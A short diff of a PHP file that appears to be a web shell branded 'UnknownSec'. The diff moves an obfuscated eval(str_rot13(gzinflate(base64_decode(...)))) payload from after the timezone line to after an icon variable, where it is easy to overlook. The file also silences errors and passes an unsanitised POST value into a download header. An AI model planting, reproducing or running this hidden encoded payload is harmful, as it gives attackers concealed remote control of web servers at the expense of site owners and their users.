@@ -7,11 +7,11 @@ error_reporting(0);
 @ini_set('max_execution_time',0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
-date_default_timezone_set('Asia/Jakarta'); eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBaeIQwEEDv/oogTxT8OvS0yxa6W2h7KcVQDxUJJo2TuourcJXGX1/XLHmhuSQzj2wzGYcrEArIjjgszZOXPCmoudnT61RBWBISe3CH//Fun3ErvpMkfz7mdsaOyTstt9YwdnHfCKzjFWAFtVhUAERiolXzLwxHpWz3E8Zk3OBy5DW0T4Qdn6MaQz/IQ4yC+nF1aI0+qU5vOxvVdkQuEaBbS3E5q5aS3SMxsclu26Ok5Jq238wEAZwFYcjSVEJdCxOvokbQNFowYzkHV3esOt5wYvtqz4ww8t5r6G6fc/QPvP157X0dgl3UpHv2qUOe3YKa5a7UMe/SM9WlYpWet/0F')))));
+date_default_timezone_set('Asia/Jakarta'); 
 $_n = 'UnknownSec';
 $_s = "<style>table{display:none;}</style><div class='table-responsive'><hr></div>";
 $_r = "required='required'";
-$_x = "<i class='bi bi-gear-fill'></i>";
+$_x = "<i class='bi bi-gear-fill'></i>"; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBEeIMwEIDf/RVOhCh1XO3TLB2sndq9jOHDHiYSWaYRW6yeWiD++rWm0MHyktx93GqXZksrayvQFjk0zZP3PCmwuenrx2qOWFGQHdvkP97vknnBD5LkYoc8zegh+cLlxpqUBm0BTgdJCahR428pBI/DY/UckTWJojVMPYWXV8lTVh51DbI5UFS45NhURq8b8EQjd+h04zheXddVgFtL6G0WH1PbF3Fvk4N+hBqjW9r+NK0DZOIQo55mrYZeKEmFx6DrumBv9Ry0tYZ3YCOMtv/wzCAkG40H72p2hv/A+5eW3rch6LlIbaQ/LdQnt8BzqwtozLv0WWjpW6Xnen4B')))));
 if(isset($_GET['option']) && $_POST['opt'] == 'download'){
 	header('Content-type: text/plain');
 	header('Content-Disposition: attachment; filename="'.$_POST['name'].'"');
